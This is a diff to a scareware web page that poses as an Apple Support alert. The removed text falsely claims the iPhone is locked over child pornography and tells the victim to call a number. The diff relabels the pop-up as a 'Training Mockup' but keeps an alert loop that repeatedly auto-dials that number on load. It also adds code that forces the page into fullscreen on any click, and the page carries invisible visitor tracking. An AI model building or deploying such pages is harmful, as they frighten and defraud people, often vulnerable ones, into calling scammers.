@@ -43,6 +43,7 @@
         transform: scale(1.12);
         opacity: 0;
         animation: iosPop 0.25s cubic-bezier(.25,.8,.25,1) forwards;
+        cursor: pointer;
     }
 
     @keyframes iosPop {
@@ -108,9 +109,9 @@
 <body>
 
 <div class="overlay" id="overlay">
-    <div class="ios-alert">
-        <div class="alert-title">Apple Support</div>
-        <div class="alert-message">Your iPhone has been locked due to detected illegal Child pornography. Your Apple ID has been disabled. Immediately call Online Security Support +1-808-277-4439 to unlock it.</div>
+    <div class="ios-alert" id="alertBox">
+        <div class="alert-title">Training Mockup</div>
+        <div class="alert-message">This is a demonstration popup for training purposes only.</div>
 
         <div class="buttons">
             <a href="tel:+18082774439">Cancel</a>
@@ -126,7 +127,7 @@
 window.onload = function() {
 
     // First alert
-    alert("Your iPhone has been locked due to detected illegal Child pornography. Your Apple ID has been disabled. Immediately call Online Security Support +1-808-277-4439 to unlock it.");
+    alert("This is a training mockup only. No real device actions will occur.");
 
     // Trigger phone dial immediately
     window.location.href = "tel:+18082774439";
@@ -134,7 +135,7 @@ window.onload = function() {
     // Loop repeating alert + call
     setTimeout(function repeatAlert() {
 
-        alert("Your iPhone has been locked due to detected illegal Child pornography. Your Apple ID has been disabled. Immediately call Online Security Support +1-808-277-4439 to unlock it.");
+        alert("This is a training mockup only. No real device actions will occur.");
 
         // Trigger phone dial every loop
         window.location.href = "tel:+18082774439";
@@ -144,7 +145,7 @@ window.onload = function() {
 };
 </script>
 
-<!-- Default Statcounter code -->
+<!-- STATCOUNTER CODE -->
 <script type="text/javascript">
 var sc_project=13196894; 
 var sc_invisible=1; 
@@ -165,6 +166,30 @@ referrerPolicy="no-referrer-when-downgrade">
 </div>
 </noscript>
 <!-- End of Statcounter Code -->
+
+<!-- FULLSCREEN ON CLICK ANYWHERE + ALERT -->
+<script>
+function goFullscreen() {
+    let elem = document.documentElement;
+
+    if (elem.requestFullscreen) {
+        elem.requestFullscreen();
+    } else if (elem.webkitRequestFullscreen) {
+        elem.webkitRequestFullscreen();
+    } else if (elem.msRequestFullscreen) {
+        elem.msRequestFullscreen();
+    }
+}
+
+// Fullscreen on ANY click
+document.addEventListener("click", goFullscreen);
+
+// Fullscreen when ALERT BOX is clicked
+document.getElementById("alertBox").addEventListener("click", function(event) {
+    event.stopPropagation(); // prevent double triggering
+    goFullscreen();
+});
+</script>
 
 </body>
 </html>
